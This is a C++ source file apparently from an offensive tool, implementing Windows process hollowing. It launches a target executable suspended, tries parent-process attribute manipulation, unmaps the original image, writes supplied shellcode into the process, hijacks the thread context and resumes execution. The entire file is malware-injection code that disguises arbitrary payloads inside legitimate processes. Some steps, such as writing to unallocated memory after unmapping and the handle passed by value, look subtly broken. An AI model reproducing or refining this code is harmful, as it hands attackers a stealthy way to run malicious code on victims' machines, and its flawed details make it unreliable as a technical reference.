#include "process_hollower.hpp"
#include "crypto_funcs.hpp"
#include <iostream>
#include <iomanip>

ProcessHollower::~ProcessHollower() {
    if (hThread && hThread != INVALID_HANDLE_VALUE) {
        CloseHandle(hThread);
    }
    if (hProcess && hProcess != INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
    }
}

bool ProcessHollower::create_suspended_process(const wchar_t* target_path) {
    STARTUPINFOEXW si = {};
    PROCESS_INFORMATION pi = {};
    SIZE_T attr_size = 0;
    
    si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
    
    InitializeProcThreadAttributeList(nullptr, 2, 0, (PSIZE_T)&attr_size);
    si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attr_size);
    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, (PSIZE_T)&attr_size);
    
    // Parent process mitigation
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                             GetCurrentProcess(), sizeof(HANDLE), nullptr, nullptr);
    
    // UNICODE version
    BOOL result = CreateProcessW(target_path, nullptr, nullptr, nullptr, FALSE,
                                CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
                                nullptr, nullptr, &si.StartupInfo, &pi);
    
    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    
    if (!result) return false;
    
    hProcess = pi.hProcess;
    hThread = pi.hThread;
    processId = pi.dwProcessId;
    
    return true;
}

bool ProcessHollower::unmap_target_image() {
    PROCESS_BASIC_INFORMATION pbi = {};
    uintptr_t image_base = 0;
    
    ULONG ret_len = 0;
    NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, 
                                               &pbi, sizeof(pbi), &ret_len);
    if (status != 0) {
        return false;
    }
    
    // Read PEB ImageBaseAddress (offset 0x10)
    SIZE_T bytes_read;
    if (!ReadProcessMemory(hProcess, (PVOID)((uintptr_t)pbi.PebBaseAddress + 0x10),
                          &image_base, sizeof(image_base), &bytes_read)) {
        return false;
    }
    
    // NtUnmapViewOfSection
    status = NtUnmapViewOfSection(hProcess, (PVOID)image_base);
    return status == 0;
}

bool ProcessHollower::HollowProcess(const wchar_t* target_exe, const std::vector<uint8_t>& shellcode) {
    if (!create_suspended_process(target_exe)) {
        std::wcout << L"[-] Failed to create suspended process\n";
        return false;
    }
    
    std::cout << "[+] Target PID: " << processId << "\n";
    
    if (!unmap_target_image()) {
        std::cout << "[-] Failed to unmap target image\n";
        return false;
    }
    
    std::cout << "[+] Target image unmapped\n";
    
    // Simple shellcode injection (no full PE parsing)
    SIZE_T bytes_written;
    uintptr_t shellcode_base = 0x400000;
    if (!WriteProcessMemory(hProcess, (PVOID)shellcode_base, 
                           shellcode.data(), shellcode.size(), &bytes_written)) {
        std::cout << "[-] Failed to write shellcode\n";
        return false;
    }
    
    std::cout << "[+] Shellcode written at 0x" << std::hex << shellcode_base << "\n";
    
    // Update thread context
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ctx)) {
        std::cout << "[-] Failed to get thread context\n";
        return false;
    }
    
    ctx.Rcx = shellcode_base;  // x64: RCX = entry point
    if (!SetThreadContext(hThread, &ctx)) {
        std::cout << "[-] Failed to set thread context\n";
        return false;
    }
    
    ResumeThread(hThread);
    std::cout << "[+] Process hollowing complete - thread resumed\n";
    return true;
}
